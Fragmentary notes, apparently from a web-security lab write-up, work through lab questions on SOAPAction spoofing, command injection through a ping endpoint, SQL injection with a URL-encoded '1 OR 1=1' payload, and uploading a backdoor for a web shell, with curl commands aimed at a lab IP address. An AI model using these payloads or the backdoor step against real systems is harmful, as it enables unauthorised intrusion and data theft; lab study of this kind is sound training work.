...
--------------------
Question in this section:
xploit the SOAPAction spoofing vulnerability and submit the architecture of the web server as your answer. Answer options (without quotation marks): "x86_64", "x86" 

Creating the above script, pointing it to the web server, and running `uname -a` gets this answer
...
`curl http://10.129.156.199:3003/ping-server.php/system/id`
...
It looks like id is a valid parameter. Let us check the response when specifying id as a parameter and a test 
...
`curl "http://10.129.156.199:3003/?id=3"`

Identify the username of the user that has a position of 736373 through SQLi. Submit it as your answer. 

URL encode this 1 OR 1=1

`curl "http://10.129.156.199:3003/?id=%31%20%4F%52%20%31%3D%31"`
...
Run the above code to gain a web shell after uploading a backdoor, then run `hostname`
